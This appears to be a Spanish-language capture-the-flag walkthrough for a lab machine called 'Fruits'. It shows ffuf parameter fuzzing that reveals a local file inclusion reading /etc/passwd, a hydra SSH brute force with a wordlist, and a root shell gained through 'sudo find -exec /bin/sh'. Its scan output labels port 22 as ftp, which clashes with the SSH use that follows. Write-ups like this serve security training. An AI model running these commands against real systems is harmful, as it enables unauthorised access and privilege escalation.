PORT   STATE SERVICE
22/tcp open  ftp
80/tcp open  http

-Entramos a la web e introducimos una fruta, la URL se transforma y parece ser un LFI pero es un rabbit hole

-Hacemos fuzzing de directorios y encontramos la ruta /fruits.php

-Hacemos fuzzing de parámetros y encontramos el siguiente:
	-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://192.168.1.137/fruits.php?FUZZ=/etc/passwd" -c -fs 1
		-Parámetro encontrado --> file
		-IMPORTANTE: En el fuzzing apuntar al /etc/passwd , si apuntamos a =id por ejemplo no funciona

-Observamos el /etc/passwd desde la URL:
	-http://192.168.1.137/fruits.php?file=/etc/passwd
		-Encontramos el usuario bananaman

-Aplicamos fuerza bruta al usuario encontrado por SSH:
	-hydra ssh://192.168.1.137 -l bananaman -P /usr/share/wordlists/rockyou.txt -V
		-Password: celtic

-Nos conectamos por ssh y obtenemos acceso a la máquina:
	-ssh bananaman@192.168.1.137
	-password: celtic
	bananaman@Fruits:~$

## Escalada de Privilegios

-sudo -l:
	/usr/bin/find

-Buscamos en Gtfobins y lo explotamos:
	-sudo find . -exec /bin/sh \; -quit
	root@Fruits:~# whoami
	root